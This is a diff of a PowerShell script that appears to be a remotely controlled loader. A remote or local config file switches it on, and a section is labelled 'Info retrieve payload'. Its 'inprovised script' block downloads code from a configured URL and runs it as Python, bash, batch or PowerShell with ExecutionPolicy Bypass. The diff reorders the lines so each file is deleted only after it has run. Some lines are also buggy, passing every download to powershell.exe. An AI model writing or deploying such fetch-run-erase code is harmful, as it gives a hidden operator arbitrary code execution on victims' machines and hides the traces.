@@ -24,7 +24,6 @@ if ($?) {
 if ($availableRemoteConfig) {
     if ($activeStatus) {
         $configFile = Invoke-RestMethod -Uri $configUrl
-        goto Active
     } else {
         Write-Host "Remote file available with 'Active=false'."
         Read-Host -Prompt "Press Enter to continue..."
@@ -35,7 +34,6 @@ if ($availableRemoteConfig) {
         $localConfigContent = Get-Content -Path $configLocal
         if ($localConfigContent -match "Active=true") {
             $configFile = Get-Content -Path $configLocal
-            goto Active
         } else {
             Write-Host "Local configuration file is not active. Exiting..."
         }
@@ -46,13 +44,17 @@ if ($availableRemoteConfig) {
     exit
 }
 
-:Active
 # Initialize variables
 $texttospeechenabled = $null
 $texttospeech = $null
 $scriptinfrenabled = $null
 $scriptinfrl = $null
 $scriptinfrn = $null
+$inprovisedscriptenabled = $null
+$inprovisedscripturl = $null
+$inprovisedscriptn = $null
+$inprovisedscriptlenguage = $null
+
 
 # Get variables from config file
 foreach ($line in $configFile) {
@@ -127,6 +129,8 @@ if ($texttospeechenabled -eq "true") {
     $vbsScript | Out-File -FilePath $vbsScriptPath -Encoding ASCII
     Start-Process "cscript.exe" -ArgumentList "//nologo", $vbsScriptPath -Wait
     Remove-Item -Path $vbsScriptPath
+} else {
+    Write-Host "Text to speech is disabled."
 }
 # Info retrieve payload
 if ($scriptinfrenabled -eq "true") {
@@ -139,28 +143,30 @@ if ($inprovisedscriptenabled -eq "true") {
     if ($inprovisedscriptlenguage -eq "python") {
         Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.py
         powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.py
-        Remove-Item -Path $inprovisedscriptn.py
         & python.exe "$inprovisedscriptn.py"
+        Remove-Item -Path $inprovisedscriptn.py
     } elseif ($inprovisedscriptlenguage -eq "bash") {
         Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.sh
         powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.sh
-        Remove-Item -Path $inprovisedscriptn.sh
         & bash.exe "$inprovisedscriptn.sh"
+        Remove-Item -Path $inprovisedscriptn.sh
     } elseif ($inprovisedscriptlenguage -eq "powershell") {
         Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.ps1
         powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.ps1
-        Remove-Item -Path $inprovisedscriptn.ps1
-        & powershell.exe -ExecutionPolicy Bypass -File "$inprovisedscriptn.ps1" 
+        & powershell.exe -ExecutionPolicy Bypass -File "$inprovisedscriptn.ps1"
+        Remove-Item -Path $inprovisedscriptn.ps1 
     } elseif ($inprovisedscriptlenguage -eq "batch") {
         Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.bat
         powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.bat
-        Remove-Item -Path $inprovisedscriptn.bat
         & "$inprovisedscriptn.bat"
+        Remove-Item -Path $inprovisedscriptn.bat
     } else {
         Write-Host "Invalid language. Exiting..."
         Read-Host -Prompt "Press Enter to continue..."
         exit
     }
+} else {
+    Write-Host "Inprovised script is disabled."
 }
 
 Write-Host "Script processed successfully."
